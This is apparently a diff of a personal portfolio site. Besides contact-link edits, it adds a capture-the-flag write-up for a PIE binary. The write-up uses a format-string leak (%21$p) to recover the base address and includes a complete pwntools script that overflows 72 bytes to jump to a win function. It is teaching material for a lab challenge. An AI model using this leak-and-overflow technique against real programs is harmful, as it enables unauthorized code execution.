@@ -160,7 +160,7 @@ document.addEventListener("DOMContentLoaded", () => {
 								<p class="contact-link"><i class="fa-brands fa-linkedin fa-fw"></i><a href="https://www.linkedin.com/in/ash-kaster/" target="_blank">Linkedin</a></p>
 								<p class="contact-link"><i class="fa-brands fa-github fa-fw"></i><a href="https://github.com/ashgreytray" target="_blank">GitHub</a></p>
 								<p class="contact-link"><i class="fa-brands fa-instagram fa-fw"></i><a href="https://www.instagram.com/ashgreytray/" target="_blank">Instagram</a></p>
-								<p class="contact-link"><i class="fa-brands fa-discord fa-fw"></i>Discord - ash.flac</p>
+								<p class="contact-link"><i class="fa-brands fa-discord fa-fw"></i> <a href="https://discord.com/users/1315726695696695307" target="_blank">Discord - ash.flac</a></p>
 								<p class="pr-desc"><i class="fa fa-envelope fa-fw" aria-hidden="true"></i><a href="#home" id="copyEmail" data-email="contact@ashgreytray.dev">contact@ashgreytray.dev</a></p>
 							</div>
 						</details>
@@ -475,7 +475,7 @@ document.addEventListener("DOMContentLoaded", () => {
 				<ul id="pr-list">
 				<li>
 					<p class="pr-title">Contacts below</p>
-					<p class="pr-desc"><i class="fa fa-envelope fa-fw" aria-hidden="true"></i><a href="#" id="copyEmail" data-email="contact@ashgreytray.dev">contact@ashgreytray.dev</a></p>
+					<p class="pr-desc"><i class="fa fa-envelope fa-fw" aria-hidden="true"></i><a href="#home" id="copyEmail" data-email="contact@ashgreytray.dev">contact@ashgreytray.dev</a></p>
 					<p class="pr-desc"><i class="fa-brands fa-linkedin fa-fw"></i><a href="https://www.linkedin.com/in/ash-kaster/" target="_blank">LinkedIn</a></p>
 				</li>
 			</ul>
@@ -544,8 +544,61 @@ p.interactive()
 			<div id="More" class="pic-coll">
 			<ul id="pr-list">
 				<li>
-					<p class="pr-title">fah.</p>
-					<p class="pr-desc">ach nö</p>
+					<p class="pr-title">Time for some pie!</p>
+					<h3 class="pr-desc" style="font-weight: bold;">Getting Started</h3><br>
+					<p class="pr-desc">Adding PIE essentailly means addresses are randomised, this gives us a challenge when doing our well...challenge, obviously chmod +x "file" to format it</p> <br>
+					<p class="pr-desc">Since addresses are randomised, we can employ pwndbg, to find out where our leak will be located, which should be at main. using pwndbg pieleak in our terminal, then run, then vmmap to find our main gives us the following: </p><br>
+					<a><img src="https://ashgreytray.github.io./ctf-assets/1-pieleak1.png" style="display:block;"></img></a><br>
+					<h3 class="pr-desc" style="font-weight: bold;">So What Do I Do Now?</h3><br>
+					<p class="pr-desc">Okay, let's break this down step by step, now that we know what our leak should look like, using %n$p to find our leak gives us %21$p which looks promising:</p><br>
+					<a><img src="https://ashgreytray.github.io./ctf-assets/2-pieleak1.png" style="display:block;"></img></a>
+					<p class="pr-desc">Testing this leak in pwndbg gives us 0x5555555544cf, which means its inside our main, looking at binary ninja, we can locate the main and win binaries at 0x4cf and 0x4b9, which is 16 apart in hex.</p><br>
+					<a><img src="https://ashgreytray.github.io./ctf-assets/3-pieleak1.png" style="display:block;"></img></a>
+					<p class="pr-desc">With all this information we can write our script to complete the CTF</p><br>
+					<h3 class="pr-desc" style="font-weight: bold;">Our Solution</h3><br>
+					<p class="pr-desc">It's best to utilise pwntools here, first you have to run the following</p><br>
+					<pre><code class="inline-code">
+python3 -m venv venv
+source ./venv/bin/activate
+pip install pwntools
+</code></pre><br>
+					<p class="pr-desc">After this we can start to use pwntools, doing <code class="inline-code">nano pieleak1.py</code> will let you start writing to a python file</p><br>
+										<pre><code class="inline-code">
+from pwn import *
+
+p = process("./pieleak")
+gdb.attach(p)
+p.sendline("%21$p")
+leak = p.recvline()
+parsed = int(leak, 16)
+
+offset = 0x4cf
+base = parsed - offset
+win = 0x4b9
+win_addr = base + win
+print(hex(win_addr))
+
+p.sendline(b"A"*72+p64(win_addr))
+p.interactive()
+</code></pre><br>
+					<p class="pr-desc">Breaking it down line by line here, this code:</p><br>
+					<p class="pr-desc">1. Imports pwntools</p><br>
+					<p class="pr-desc">2. Runs ./pieleak in your terminal to start the challenge</p><br>
+					<p class="pr-desc">3. Attaches gbd, which is actually our pwndbg.</p><br>
+					<p class="pr-desc">4. We send our leak "%21$p", then associate that to a variable, getting the base 16.</p><br>
+					<p class="pr-desc">5. We calculate the offset, using the main and parsed value, and find the win address using the value from binary ninja and base.</p><br>
+					<p class="pr-desc">6. Calculates the end win address and overflows 72 bytes to access the binary. This then uses p64 to send the end win address as raw bytes.</p><br>
+					<p class="pr-desc">Since you've written the code <code class="inline-code">python pieleak1.py</code> should show that you have properly completed this CTF :)</p> 
+					<a><img src="https://ashgreytray.github.io./ctf-assets/4-pieleak1.png" style="display:block;"></img></a>
+					
+					
+					<div class="tag-list">
+						<p class="tag">PWNTOOLS</p>
+						<p class="tag">UNIX</p>
+						<p class="tag">BINARY NINJA</p>
+						<p class="tag">PIE</p>
+					</div>
+					<br>
 					<p><a href="https://ashgreytray.github.io./ctf-assets/pieleak" download>[CTF File]</a></p> <p><a href="https://ashgreytray.github.io./ctf-assets/pieleak.c" download>[Source Code]</a></p>
 				</li>
 			</ul>
@@ -664,15 +717,16 @@ p.interactive()
 								<p class="contact-link"><i class="fa-brands fa-linkedin fa-fw"></i><a href="https://www.linkedin.com/in/ash-kaster/" target="_blank">Linkedin</a></p>
 								<p class="contact-link"><i class="fa-brands fa-github fa-fw"></i><a href="https://github.com/ashgreytray" target="_blank">GitHub</a></p>
 								<p class="contact-link"><i class="fa-brands fa-instagram fa-fw"></i><a href="https://www.instagram.com/ashgreytray/" target="_blank">Instagram</a></p>
-								<p class="contact-link"><i class="fa-brands fa-discord fa-fw"></i>Discord - ash.flac</p>
+								<p class="contact-link"><i class="fa-brands fa-discord fa-fw"></i> <a href="https://discord.com/users/1315726695696695307" target="_blank">Discord - ash.flac</a></p>
 						
 					</div>
 					<div class="grid-row-box">
 						<h2>Contact</h2>
 						<p>I would prefer Discord for more casual contact: ash.flac for Discord.</p>
+						<p class="contact-link"><i class="fa-brands fa-discord fa-fw"></i> <a href="https://discord.com/users/1315726695696695307" target="_blank">Discord - ash.flac</a></p>
 						<br>
 						<p>More professional inquiries can go to:</p>
-						<p class="pr-desc"><i class="fa fa-envelope fa-fw" aria-hidden="true"></i><a href="#about" id="copyEmail" data-email="contact@ashgreytray.dev">contact@ashgreytray.dev</a></p>
+						<p class="pr-desc"><i class="fa fa-envelope fa-fw" aria-hidden="true"></i><a href="#home" id="copyEmail" data-email="contact@ashgreytray.dev">contact@ashgreytray.dev</a></p>
 					</div>
 				</div>
 			</div>
@@ -681,6 +735,7 @@ p.interactive()
 </body>
 
 </html>
+
 
 
 
